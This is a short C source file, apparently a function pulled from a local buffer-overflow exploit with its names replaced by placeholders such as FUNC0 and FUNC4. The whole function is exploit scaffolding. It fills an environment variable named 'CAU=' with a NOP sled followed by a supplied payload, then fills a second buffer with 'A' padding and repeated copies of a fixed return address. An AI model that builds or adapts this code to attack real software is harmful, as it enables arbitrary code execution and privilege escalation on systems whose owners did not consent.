#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned long ADDRESS ; 
 scalar_t__ DEBUG ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,...) ; 
 int FUNC3 (char*) ; 

unsigned long FUNC4(char *env_buffer, char *address_buffer, char *payload, int environment_size, int buffer_size) {
        int count, env_size = FUNC3(payload) + environment_size + 4 + 1;
        unsigned long address, *ret_addressp;
        
        if (DEBUG) FUNC2("Adding nops to environment buffer...");
        for ( count = 0; count < env_size - FUNC3(payload) - 1; count++ ) {
            *(env_buffer++) = NOP;
        }
        if (DEBUG) FUNC2("size %d...\n", count);
        if (DEBUG) FUNC2("Adding payload to environment buffer...");
        for ( count = 0; count < FUNC3(payload); count++ ) {
            *(env_buffer++) = payload[count];
        }
        if (DEBUG) FUNC2("size %d...\n", count);

        env_buffer[env_size - 1] = '\0';

        FUNC0(env_buffer, "CAU=", 4);

	FUNC1(address_buffer, 'A', buffer_size);

        address = ADDRESS;

        if (DEBUG) FUNC2("Going for address @ 0x%lx\n", address);

        if (DEBUG) FUNC2("Adding return address to buffer...");
        ret_addressp = (unsigned long *)(address_buffer+3);
        for ( count = 0; count < buffer_size; count += 4) {
                *(ret_addressp++) = address;
        }
        if (DEBUG) FUNC2("size %d...\n", count);

        address_buffer[buffer_size - 1] = '\0';

        return( 0 );
}